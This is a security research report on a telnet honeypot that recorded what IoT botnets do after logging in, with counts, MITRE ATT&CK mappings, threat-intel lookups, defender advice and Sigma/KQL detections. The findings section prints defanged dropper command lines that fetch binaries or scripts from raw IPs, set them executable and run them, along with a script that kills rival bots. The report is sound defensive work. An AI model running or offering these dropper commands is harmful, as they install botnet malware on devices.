# What IoT botnets do after logging in: a telnet honeypot in Rust

[Timothy Fletcher](https://timfletcher.tech) · November 2026 · Data from 2026-11-03 01:29 UTC to 2026-11-10 19:45 UTC (186 hours)

## Summary

- **What I built:** a medium-interaction telnet honeypot in Rust, run on Google Cloud for 186
  hours. 18 common factory-default logins get into a shell that's entirely fake. Every reply is
  fixed text compiled into the program, and nothing a visitor sends is ever run or fetched.
- **What I found:** 839 of 5,527 connections logged in and sent 3,784 commands, including 23
  attempts to download and run malware. None of them produced an outbound connection. Most bots
  followed the same playbook, mapped below to MITRE ATT&CK.
- **What it shows:** a fixed-reply shell is safe but easy to spot. Almost every bot that checked
  for its own marker word left before the payload stage. Silent visitors fell from 82% to 12% after
  the server began opening with telnet negotiation. The IP address stayed the same, but almost none
  of the earlier visitors came back and the baseline is one day, so that cause isn't proven.

| Headline | Value |
| --- | --- |
| Time live | 186 hours, one server, port 23 only |
| Connections | 5,527 from 790 IP addresses |
| Logins into the fake shell | 839 from 330 IP addresses |
| Commands | 3,784, of which 152 were different |
| Download attempts | 23 sessions from 12 IPs, naming 17 different addresses on 9 servers |
| Already reported to AbuseIPDB | At least 316 of the 330 IPs that got into the shell (96%), and at least 867 of all 901 seen Nov 2–10 (96%), before they reached the honeypot |
| Reported to AbuseIPDB by me | 170 IPs, 49 on Nov 8 and 121 on Nov 10. I was the first to report 7 of them in the past year |
| Outbound connections made by the honeypot | **0** |
| Crashes, restarts, program errors | 0, 0, 0 |
| Visits that sent nothing at all | 12%, down from 82% before the telnet opening |
| Data sent by the server | 0.4 to 1.3 MB a day |
| Automated tests | 293 Rust tests passing, 17 of them guarding the safety rules, and 91 Python tests for the analysis and reporting scripts |

## Architecture and safety design

The program is about 6,600 lines of Rust, including tests, with three dependencies (`chrono`,
`serde`, `serde_json`). It runs on a single e2-micro sized for Google Cloud's Free Tier, built by
Terraform ([deploy/gcp/main.tf](deploy/gcp/main.tf)).

```text
Internet ── TCP 23 ──▶ Google Cloud firewall ──▶ Debian 13 e2-micro
                        in:  23 from anywhere      nftables: 23 redirected to 2323,
                             22 from IAP only      default drop in and out,
                        out: deny all, logged      honeypot user gets no outbound at all
                                                         │
                                                         ▼
                                        honeypot (Rust, unprivileged, systemd sandbox)
                                        fake login ─▶ fake shell with fixed replies
                                                         │
                                                         ▼
                                        JSON-lines logs, private, deleted after 30 days
                                                         │  copied once a day over IAP SSH
                                                         ▼
                                        deploy/daily-logs.sh: counts only, automatic STOP checks
```

Each layer assumes the one above it has failed.

| Layer | What it does | How it was checked |
| --- | --- | --- |
| Code ([src/fake_shell.rs](src/fake_shell.rs)) | Replies have the type `&'static str`, so the compiler refuses to send back anything a visitor typed. Downloads get a believable failure such as `-sh: Network is unreachable`. The code has no HTTP client, name lookup or process API, and `#![forbid(unsafe_code)]` is set | 17 `guard_` tests that must always pass, for example that the shell's file can't reach files, programs or the network, and that no new crate appears. Another test aims every kind of download at a real listener and checks that nothing connected |
| Process ([deploy/host/honeypot.service](deploy/host/honeypot.service)) | Unprivileged user, no capabilities, `NoNewPrivileges`, `ProtectSystem=strict`, `MemoryDenyWriteExecute`, a syscall filter, IPv4 only, 256 MB memory and 50% CPU caps | Restart count and memory peak (2.4 MB) in the daily summary |
| noexec ([deploy/host/honeypot-shell.conf](deploy/host/honeypot-shell.conf)) | `NoExecPaths=/` with `ExecPaths=/opt/honeypot`: even if a bug tried to start a program, the only folder it could run one from is the honeypot's own | Read the running process's mount table before opening the port and saw `noexec`. Daily: 0 other programs run by the honeypot user, 0 files it owns outside its logs |
| Host firewall ([deploy/host/nftables.conf](deploy/host/nftables.conf)) | Default drop. Every new outbound connection from the honeypot user is logged and dropped, with no exceptions. DNS is blocked, so data can't be smuggled out in lookups. This layer also covers the metadata server, which cloud firewall rules don't | An outbound test to `1.1.1.1:443` was blocked |
| Cloud firewall | Only TCP 23 is open to the internet. SSH is reachable only from Google's IAP range, never on the public IP. Egress is denied and logged | The same outbound test with the host firewall off was blocked. From outside, ports 22 and 2323 were closed |
| Cloud identity | No service account, so the server has no Google Cloud permissions. Serial port off, project-wide SSH keys blocked | Set in Terraform, which has no `service_account` block |
| Limits | 64 connections, 4 per IP, 60 visits a minute, 30 seconds per visit. Each session is capped at 200 lines, 64 KB stored and 8 KB of replies. The shell has a 20 MB daily budget and logging a 100 MB one | "Refused by the limits" and data sent, in the daily summary |
| Operations ([deploy/daily-logs.sh](deploy/daily-logs.sh)) | A daily script copies the logs, prints only counts and prints STOP, with the reason, if any rule is broken. The kill switch is deleting one firewall rule | Ran with no STOP, most recently on 2026-11-10 |

**Egress results, Nov 3 to Nov 10:**

| Check | Result |
| --- | --- |
| Outbound attempts by the honeypot user (host firewall log) | 0, despite 154 download addresses (17 unique) sent to it |
| Other blocked outbound lines | 5, all from the planned admin self-test at launch |
| Cloud firewall egress log | 0 hits |
| Data sent per day, by Google's own count | 0.4 to 1.3 MB |

## How I built it

I learned Rust while building this, through staged exercises set up by Claude Code. I wrote the
exercise code; when I got stuck, Claude Code helped debug and fixed parts of two exercises at my
request. It also wrote the scaffolding, the tests, the deployment scripts and the log analysis,
and drafted this report from that analysis. I reviewed every change before it reached the
server, made each safety and data-handling decision myself, and can explain how each layer works.

## Findings: the post-login playbook

Of 5,527 connections, 4,805 (87%) sent a login, 839 were accepted, 706 of those sessions sent at
least one command, and 23 (2.7% of sessions) reached a download. Sessions ended in two ways: 531
hung up and 308 waited until the 30-second limit.

| Step | What bots sent (masked) | MITRE ATT&CK | Lines | IPs |
| --- | --- | --- | --- | --- |
| Log in with factory defaults | Common usernames such as `root`, `admin`, `default`, `support` | T1110.001 Password Guessing, T1078.001 Default Accounts | 4,805 logins | 330 got in |
| Break out of a router's limited menu | `enable`, `system`, `shell`, `sh`, `linuxshell`, sometimes ending in a NUL byte | T1059.008 Network Device CLI, T1059.004 Unix Shell | 2,349 | 211 |
| Try a router CLI | `config terminal`, `start`, `su` | T1059.008 Network Device CLI | 588 | 58 |
| Inject a shell into a ping tool | `ping ;sh`, also sent as `ping; sh` and `ping;sh` | T1059.004 Unix Shell | 137 | 117 |
| Look around | `uname -m`, `cat /proc`, `cat /etc/passwd`, `id`, `ls /home` | T1082, T1087.001, T1033, T1083 | 257 | 117 |
| Find a writable folder, then check with a hex `echo` | `>/var/run/.x&&cd /var/run;…`, `>/tmp/.ptmx && cd /tmp/` (below) | T1083 File and Directory Discovery | 221 | 60 |
| Check for a real BusyBox | `/bin/busybox SORA`, or a random word | T1497.001 System Checks (closest fit) | 73 | 24 |
| Check that `echo` works | Hex `echo -e` markers, `echo PAYLOAD_WORKING` | T1497.001 System Checks (closest fit) | 16 | 12 |
| The `SHELL_TEST` check | `echo SHELL_TEST`, then hang up | T1497.001 System Checks (closest fit) | 58 | 3 |
| Download and run | `wget`, `curl`, `tftp` and `ftpget` fallbacks, `chmod 777`, run in the background | T1105 Ingress Tool Transfer, T1222.002, T1059.004 | 23 | 12 |
| Remove rival bots | `killall -9` a list of other botnets' names, or a script that kills them | T1489 Service Stop (closest fit) | 2 | 2 |
| Clean up | Delete the script after running it | T1070.004 File Deletion | 6 | 5 |

Examples, masked and defanged. IPs keep only their first two numbers, and IDs or file names that
could identify this honeypot are replaced with `<id>` and `<name>`. Long lines are shortened with
`…`.

```text
# The writable-folder probe. The 6-letter marker is random, with 60 variants seen
>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;…;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x48\x47\x4a\x4e\x4e\x4f'

# Plainer forms from Nov 10, one folder per line, without the marker
>/tmp/.ptmx && cd /tmp/
/bin/busybox echo > /tmp/0 && sh /tmp/0 && cd /tmp/

# BusyBox checks with a made-up "applet", often a botnet's name: SORA, YAKUZA, KYTON, V3G4, Cult, UNSTABLE, HISILICON, BOTNET.
# From Nov 9, some bots sent a random eight-character word of mixed case and digits instead
/bin/busybox SORA

# Hex echo markers. These two decode to auth_ok and redtail_bot_telnet_ok
echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B"

# The most repeated dropper: one line fetching builds for three CPU types, each with three fallbacks
cd /tmp || cd /var || cd /dev/shm || cd /mnt; (wget -q -O main_arm7 hxxp://201[.]79[.]x[.]x:8081/main_arm7 || curl -s -O hxxp://201[.]79[.]x[.]x:8081/main_arm7 || tftp -g -r main_arm7 201[.]79[.]x[.]x 69) 2>/dev/null; chmod 777 main_arm7; nohup ./main_arm7 arm7 >/dev/null 2>&1 & … (repeated for main_mips and main_mpsl)

# Fetch a script and pipe it straight into a shell, telling it how it got in
(wget --no-check-certificate -qO- hxxps://217[.]60[.]x[.]x/sh || curl -sk hxxps://217[.]60[.]x[.]x/sh) | sh -s telnet

# Kill rival bots, delete other programs from temporary folders, then fetch, run and delete a script
busybox sh -c 'for p in mirai sora mozi hajime tsunami gafgyt yakuza owari josho ECCHI; do killall -9 $p 2>/dev/null; done; … wget -q -O <name>.sh hxxp://168[.]220[.]x[.]x:9087/payload/<id>/<name>.sh … sh <name>.sh; rm -f <name>.sh'

# From Nov 8: nine fallbacks, ending with BusyBox's FTP client, then run the script and delete it
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget hxxp://37[.]221[.]x[.]x/all.sh || curl -O hxxp://37[.]221[.]x[.]x/all.sh || busybox wget hxxp://37[.]221[.]x[.]x/all.sh || busybox tftp 37[.]221[.]x[.]x -c get all.sh || … || busybox ftpget -v -u anonymous -p anonymous -P 21 37[.]221[.]x[.]x all.sh all.sh || … ;chmod 777 all.sh;sh ./all.sh;rm -rf all.sh

# Every tool in turn rather than as fallbacks, so all of them run
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox wget -q -O telnet2.sh hxxp://176[.]65[.]x[.]x/telnet2.sh; busybox wget …; wget …; curl …; busybox curl …; tftp …; tftp …; ftpget -v -u anonymous -p anonymous -P 21 176[.]65[.]x[.]x telnet2.sh telnet2.sh; chmod 777 telnet2.sh; sh telnet2.sh; rm -rf telnet2.sh
```

All 17 download addresses named a raw IP, on 9 servers. 6 were a server named on its own, for
TFTP or FTP. These are the 11 URLs, with the day each was first seen:

```text
hxxp://160[.]119[.]x[.]x/bins/kla.sh                     Nov 3
hxxps://217[.]60[.]x[.]x/sh                              Nov 4
hxxp://168[.]220[.]x[.]x:9087/payload/<id>/<name>.sh     Nov 6
hxxp://201[.]79[.]x[.]x:8081/main_arm7                   Nov 6
hxxp://201[.]79[.]x[.]x:8081/main_mips                   Nov 6
hxxp://201[.]79[.]x[.]x:8081/main_mpsl                   Nov 6
hxxp://176[.]65[.]x[.]x/telnet2.sh                       Nov 8
hxxp://160[.]187[.]x[.]x/all.sh                          Nov 9
hxxp://37[.]221[.]x[.]x/all.sh                           Nov 9
hxxp://102[.]220[.]x[.]x/curl.sh                         Nov 10
hxxp://102[.]220[.]x[.]x/wget.sh                         Nov 10
```

**What stands out**

- **Most bots check before they commit, and a fixed-reply shell fails the check.** 339 of the 706
  sessions with commands ran a check that only a real shell passes, because it needs the bot's own
  word repeated back. The honeypot never repeats input, by design: `echo` gets a blank line, and
  `/bin/busybox SORA` gets `busybox: applet not found` where a real device would say
  `SORA: applet not found`. 335 of those 339 sessions ended on a check without trying a
  download. Only 4 went on to download anyway.
- **The playbook is old and stable.** Mirai's leaked source sends `enable`, `system`, `shell` and
  `sh` after logging in, then `/bin/busybox <WORD>`
  ([source code review](https://medium.com/@cjbarker/mirai-ddos-source-code-review-57269c4a68f)).
  Variants keep the same strings with their own word: a string table extracted by
  [miraicfg](https://github.com/FernandoDoming/miraicfg) holds `/bin/busybox JOSHO` and the reply
  it waits for, `JOSHO: applet not found`. Here, 124 sessions opened with exactly `enable`,
  `system`, `shell`, `sh`, then `linuxshell`. The family names in this data come only from the
  bots' own strings. No samples were fetched, so the families aren't confirmed.
- **Later bots changed their words, not their steps.** From Nov 9, 12 sessions from 5 IPs ran the
  BusyBox check with a random eight-character word of mixed case and digits instead of a name,
  each after `enable`, `system`, `shell`, `sh`. A second bot that ends its menu words in a NUL byte
  appeared on Nov 10: 35 sessions from one IP never seen before, each held for the full 30
  seconds, next to the first one's 122 sessions from Nov 3 to Nov 6.
- **Bots compete for devices.** One dropper tries to kill ten rival botnets by name and deletes
  other programs from the temporary folders before installing its own. Another bot wrote a script
  in 3 hex-escaped `echo` lines that kills any process named after 20 other botnets or 6 CPU
  builds, or whose program was deleted or hidden, then ran it 10 times. Decoded, it holds no
  address:

  ```sh
  #!/bin/sh

  for pid in /proc/[0-9]*; do
      [ "$pid" = "/proc/1" ] && continue
      [ "$pid" = "/proc/2" ] && continue
      case "$(ls -l $pid/exe || readlink $pid/exe || busybox readlink $pid/exe)" in
          *"(deleted)"*|*"/."*|*mirai*|*mozi*|*hajime*|*sora*|*reaper*|*gafgyt*|*bashlite*|*muhstik*|*selfrep*|*loligang*|*yakuza*|*qbot*|*zbot*|*tokyyo*|*kotori*|*owari*|*demon*|*vpnfilter*|*dvrHelper*|*dvrLocker*|*arm*|*mips*|*mpsl*|*mipsel*|*aarch64*|*x86*) kill -9 ${pid##*/} ;;
      esac
  done
  ```
- **Droppers plan for failure.** Every one tried several download tools. 19 of the 23 chained
  them with `||`, such as `wget`, then `curl`, then `tftp`, so each ran only if the one before
  failed, and the other 4 ran every tool in turn. From Nov 8, 6 of them, from 5 IPs, also fell back
  on BusyBox's FTP client, `ftpget`, which none had used before. Two passed `telnet` to their
  payload, most likely to record how they got in.
- **An open question.** 58 sessions from 3 IPs, on Nov 3, 4 and 8, logged in, sent only
  `echo SHELL_TEST`, received a blank line and hung up. The likeliest explanation is that they
  wanted the word back, but a bot that only checks logins and reports them elsewhere would look the
  same. A fixed reply for that one command is written and tested, but not yet deployed.

## Threat intel: were these IPs already known?

On Nov 10 and Nov 11 I checked every IP that visited between Nov 2, when the fake login went live,
and Nov 10 (901 in all, so the 790 above plus those seen only on the day before the shell) against
AbuseIPDB's check API, asking for a year of reports. Only the IP addresses were sent, with nothing
from the logs. [analysis/threat_intel_lookup.py](analysis/threat_intel_lookup.py) does the lookups.

- **Almost all were already reported.** Of the 330 IPs that got into the fake shell, 328 (99%) had
  reports from the past year. At least 316 (96%) had been reported before the honeypot first saw
  them, and as many as 319 (97%) may have been, as the note below explains. All 901 visitors give
  the same shares: 891 (99%) had reports from the past year, and at least 867 (96%) and as many as
  871 (97%) had been reported before. For the 750 whose earlier reports AbuseIPDB lists, the
  earliest came a median of at least 28 days before. 10 of the 901 had no reports in the past year.
  At least 48 of the 901 were research scanners such as Censys, Shadowserver and Shodan, matched the
  way [analysis/abuse_review.py](analysis/abuse_review.py) skips them when reporting: none got into
  the shell, all had been reported before, and leaving them out moves none of these shares by as
  much as a point.
- **The download IPs had all been reported before.** All 12 IPs that tried a download had been
  reported before they arrived. For 5 of them only the second check in the note below could show it,
  because all 100 of their listed reports came after the honeypot saw them.
- **Widespread campaigns and persistent bots.** Grouping sessions by the exact commands they sent,
  the three campaigns spread over many IPs: the router-CLI and writable-folder probe (58 of 58 IPs
  reported before they arrived), the `enable` … `ping ;sh` opening (97 of 100) and the `HISILICON`
  BusyBox check (8 of 8). The bots that came back dozens of times from one to three IPs: `uname -m`
  then `cat /proc` (3 IPs), `echo SHELL_TEST` (3 IPs) and the two NUL-word bots (1 IP each). 7 of
  those 8 IPs score 100 now and the eighth scores 65. 6 had been reported before the honeypot saw
  them, 5 of them shown only by the second check, and for the other 2 it can't be told.
- **Most were on ordinary connections.** 696 of the 901 were on networks AbuseIPDB classes as
  fixed-line ISPs, the kind that sell home and office broadband, rather than hosting.
- **Most of my reports weren't the first.** Of the 170 IPs I reported, someone else had reported
  162 first: 158 shown by the reports AbuseIPDB lists, and 4 more by a second check like the one in
  the note below, counting from a day or more before my report. I was the first in the past year
  for 7, all reported on Nov 10. For the last one, mine wasn't among the newest 100 reports that
  AbuseIPDB lists, and the second check counted more reports than the first lookup had, because
  more came in between, so it can't be told.

AbuseIPDB returns only the past year of reports, so "before" means within that year, and scores are
as of Nov 10 and Nov 11, after these IPs had visited and after my own reports of 170 of them. It
also lists only the newest 100 reports for each IP: its docs say up to 10,000, but no lookup here
listed more than 100. 397 IPs had more, so their oldest reports weren't listed, which is why the 28
days is a lower bound. For 121 of those, all 100 listed reports came after the honeypot saw them.
For each of these I made a second check, asking only how many reports had come in since a day or
more before the honeypot first saw the IP. Where the year check had counted more, the rest were
older: that showed 117 had been reported before. The two counts weren't taken at the same time: the
year checks on Nov 10 and Nov 11, the second checks on Nov 11 and Nov 13. Reports that came in
between count only in the second, so the gap can hide older reports but never add any. For each of
the other 4, the second check counted more reports than the year check had, so it can't be told,
which is the gap between 867 and 871 above.

## What defenders should do

Every step of the playbook above depends on something a network owner controls.

1. **Block inbound telnet (23 and 2323) at the edge.** 87% of connections here sent a login,
   and an open telnet port was all any of these bots needed to start.
2. **Change factory-default logins before a device is deployed.** 18 common defaults were enough
   for 839 logins from 330 IPs in 186 hours.
3. **Put IoT devices on their own network segment, with outbound traffic restricted to what they
   need.** Every dropper here had to fetch its payload from a raw IP address, over ports 80, 443,
   8081 and 9087 or over TFTP or FTP. An outbound allow-list would have stopped every download in this
   data, as this honeypot's own firewalls did.
4. **Alert on new outbound connections from IoT devices.** These devices talk to a small, fixed
   set of servers, so a connection to an unfamiliar address is worth a look, especially within
   minutes of an inbound login. Detection 3 below does this from firewall logs.
5. **Use IP reputation blocklists, but as one layer, not the defence.** At least 316 of the 330 IPs
   that got into the shell (96%) had been reported to AbuseIPDB before they reached the honeypot,
   so a reputation blocklist would likely have flagged most of them. A past report isn't the same
   as a high score on the day, though: the lookups give only each IP's score when it was checked,
   so what these IPs scored when they arrived can't be seen. By Nov 11, 551 of the 901 IPs (61%)
   scored 75 or above, and at least 2 of those, and as many as 6, had no reports until after they
   reached the honeypot. A blocklist only knows yesterday's attackers, so it adds to steps 1 to 4
   rather than replacing them.

**The detections were updated as the bots changed.** Detection 1 now looks for an upper-case
letter anywhere in BusyBox's applet word, so a random word that starts in lower case is caught.
Detection 2 now covers `ftpget` and a script piped from `-O-` at the end of a line. Detection 3
already covered FTP, because it flags any new outbound connection except DNS and NTP.
[analysis/test_detections.py](analysis/test_detections.py) tests detections 1 and 2 as published
against the real command lines, masked.

The follow-up project, [playbook-defense](https://github.com/NotKornFlakes/playbook-defense),
turns these findings into alerts, a firewall allowlist and an internal decoy.

## The telnet opening: result and caveat

**Why it was added.** In the day before the shell, the honeypot only showed a login prompt, and
82% of visits sent nothing at all. 241 of those silent visits came from 11 IPs with the same
rhythm: connect, stay silent for about 8 seconds, hang up, and try again about 5 seconds later.
Real devices start telnet negotiation as soon as a client connects, and
[ignoring negotiation is a known way to spot a honeypot](https://www.cl.cam.ac.uk/~amv42/papers/vetterl-clayton-bitter-harvest-woot-18-slides.pdf).
The hypothesis was that these bots were waiting for the server to speak first, so the shell
release starts every connection with the negotiation a small device would send.

| | Before: 24 hours, fake login only | After: Nov 3 to Nov 6, opening and shell |
| --- | --- | --- |
| Visits | 520 | 2,450 (713 in the first 24 hours) |
| Sent nothing at all | 425 (82%) | 284 (12%). First 24 hours: 99 (14%) |
| Sent nothing, leaving out the 11 retry IPs | 184 of 279 (66%) | Not applicable: they never returned |
| Sent a login | 81 (16%) | 2,132 (87%) |
| Answered the telnet negotiation | Not offered | 1,994 (81%) |
| IPs showing the silent retry rhythm | 11 | 0 on every day |
| The 7 IPs seen in both periods | 44 of 109 visits silent (40%) | 35 of 434 visits silent (8%) |

Silent visits stayed between 8% and 13% on each calendar day. Through Nov 10, they stayed between
8% and 14% each day.

**The caveat.** Turning on the shell meant reinstalling the server, but it kept the same public IP
address. The rebuilt server briefly had another address, and its restart before the port reopened
gave the original back. So a change of address doesn't explain the result. Two limits remain.
First, the visitors changed: only 7 of the 117 IPs from the day before were seen again. Those 7
went from 40% silent to 8%, which points the same way, but 7 is too few to carry the claim. Second,
the baseline is a single day. The 11 retry IPs never came back, even though the address was the
same, so the hypothesis about those bots specifically is untested. What the data supports: silent
visits fell sharply after the change and stayed low through Nov 10. The opening is the likeliest
cause, but this setup can't rule out a change in who was visiting.

## Detection ideas

These come from the patterns above, and none has been run against production telemetry yet. Most
IoT devices can't run an endpoint agent, so the two Sigma rules suit Linux servers and appliances
that log process starts (auditd or eBPF), while the KQL query works from firewall logs, which do
see IoT devices.

**1. BusyBox started with a made-up applet name (Sigma).** Real applet names are lower case.
Bots use an upper-case word, or a random word of mixed case, to test for a real BusyBox, so the
rule looks for an upper-case letter anywhere in the word.

```yaml
title: BusyBox Started With a Word Holding an Upper-Case Letter Instead of an Applet
id: 49d81c14-1dc7-451f-8515-05d2f6bf4e89
status: experimental
description: >
  Detects BusyBox run with a word holding an upper-case letter where an applet name belongs,
  such as "/bin/busybox SORA" or a random word of mixed case. IoT bots send this right after
  logging in and expect "SORA: applet not found" back, which tells them the shell is real.
author: Timothy Fletcher
date: 2026-11-06
modified: 2026-11-10
tags:
  - attack.discovery
  - attack.t1082
  - attack.defense-evasion
  - attack.t1497.001
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith: '/busybox'
    CommandLine|re: 'busybox [a-z0-9]*[A-Z]'
  condition: selection
falsepositives:
  - Unlikely, since real BusyBox applet names are lower case
level: high
```

**2. A download tool fetches a CPU-named binary or a piped script from a bare IP, or uses FTP
(Sigma).** All 17 download addresses in the data used a raw IP. 7 of the 11 URLs named the file
after a CPU type, sat under `/bins/`, or were piped straight into `sh`, and 6 droppers also fell
back on BusyBox's `ftpget`. A known gap remains: a script with a generic name such as `all.sh`,
saved to a file, isn't caught, because matching any script fetched from a bare IP would also flag
internal installers.

```yaml
title: Download Tool Fetches a CPU-Named Binary or Piped Script, or Uses FTP, From a Bare IP Address
id: 2d2e6608-74b8-4e82-8dbc-15bfed00844b
status: experimental
description: >
  Detects wget, curl, tftp or BusyBox fetching from a raw IPv4 address where the file is
  named after a CPU type (arm7, mips, mpsl and so on), sits under /bins/, or is written to
  standard output for a shell, and BusyBox's ftpget fetching anything from a raw IPv4 address.
  IoT droppers on a telnet honeypot fetched their payloads this way.
author: Timothy Fletcher
date: 2026-11-06
modified: 2026-11-10
tags:
  - attack.command-and-control
  - attack.t1105
logsource:
  category: process_creation
  product: linux
detection:
  selection_tool:
    Image|endswith:
      - '/wget'
      - '/curl'
      - '/tftp'
      - '/busybox'
      - '/ftpget'
  selection_bare_ip:
    CommandLine|re: '(^|[\s/@])\d{1,3}(\.\d{1,3}){3}([\s:/]|$)'
  selection_payload:
    - CommandLine|re: '[_./-](arm[4-7]?|mips|mpsl|mipsel|m68k|ppc|sh4|spc|x86|i[3-6]86)(\s|$)'
    - CommandLine|contains: '/bins/'
    - CommandLine|re: '\s-(qO|O|o)-(\s|$)'
  selection_ftp:
    CommandLine|re: '(^|[\s/])ftpget\s'
  condition: selection_tool and selection_bare_ip and (selection_payload or selection_ftp)
falsepositives:
  - Internal package mirrors reached by IP address that serve one build per CPU type
level: medium
```

**3. Telnet allowed in from the internet, then the device starts connecting out (KQL, Microsoft
Sentinel).** In this data, every download command came less than 30 seconds after the connection
opened. On a real network, that pair is the moment a device joins a botnet.

```kql
// Inbound telnet from the internet reached an internal host, and within 10 minutes that host
// connected out to the internet. DeviceAction values differ by firewall vendor, so adjust the list.
let lookback = 1d;
let telnet_in = CommonSecurityLog
    | where TimeGenerated > ago(lookback)
    | where DestinationPort in (23, 2323)
    | where DeviceAction in~ ("allow", "accept", "permit", "allowed", "accepted")
    | where ipv4_is_private(DestinationIP) and not(ipv4_is_private(SourceIP))
    | project InTime = TimeGenerated, Device = DestinationIP, Attacker = SourceIP;
let outbound = CommonSecurityLog
    | where TimeGenerated > ago(lookback)
    | where DeviceAction in~ ("allow", "accept", "permit", "allowed", "accepted")
    | where ipv4_is_private(SourceIP) and not(ipv4_is_private(DestinationIP))
    | where DestinationPort !in (53, 123)
    | project OutTime = TimeGenerated, Device = SourceIP, Remote = DestinationIP, DestPort = DestinationPort;
telnet_in
| join kind=inner outbound on Device
| where OutTime between (InTime .. (InTime + 10m))
| summarize Attackers = dcount(Attacker), FirstSeen = min(InTime),
    Destinations = make_set(strcat(Remote, ":", tostring(DestPort)), 20) by Device
| order by Attackers desc
```

## Limits

- **Short and narrow.** 186 hours, one IP address in one cloud region, telnet only. Cloud address
  ranges attract their own mix of scanners, so these numbers may not match a home or business
  network.
- **The fake shell is easy to spot.** That's a deliberate trade for safety, but it means the
  data shows the first steps of an attack much better than what comes after the download.
- **No malware samples.** By design the honeypot never fetches an address, so there are no file
  hashes, and family names rest on the bots' own strings.
- **Time wasted isn't measured.** Each log line records when a visit started, not when it ended.
  The 30-second cap gives an upper bound, and 308 sessions ran into it.
- **The telnet result is confounded** by visitor turnover, as described above, and its baseline is
  one day.
- **Monitoring is daily, not continuous.** The STOP checks run when the daily script runs. Logs
  stay on the server until they're copied, and there's no separate log collector.
- **Data handling** decisions (30-day retention, private storage, masking before anything is
  shared) were made without a legal review.
- **The detection rules** haven't been tested against real telemetry.

## Next steps

1. Deploy the fixed `SHELL_TEST` reply, which is already written and tested, to see whether those
   bots go further when the word comes back. Reinstalling can change the address, so they may not
   return.
2. Record when each session ends, so time wasted can be measured instead of bounded.
3. Test the telnet opening directly by switching the shell, and with it the opening, off for a day
   and back on, without reinstalling. If silent visits rise while it's off and fall again after,
   the cause is the opening rather than a change in visitors.
4. Keep collecting to the planned two weeks, and keep reporting the IPs that get into the shell
   to AbuseIPDB each day, with no log contents. 170 are reported so far.
5. Convert the Sigma rules with `sigma-cli` and test all three detections against synthetic
   events, never by running a logged command.
6. Carry on with the roadmap: a fake web service with full request logging, then an offline
   report tool for the downloaded logs.

*How the examples were prepared: every value in this report is a count or a masked pattern. Raw
logs are never published, nothing in them is run or opened, and they're deleted after 30 days.*
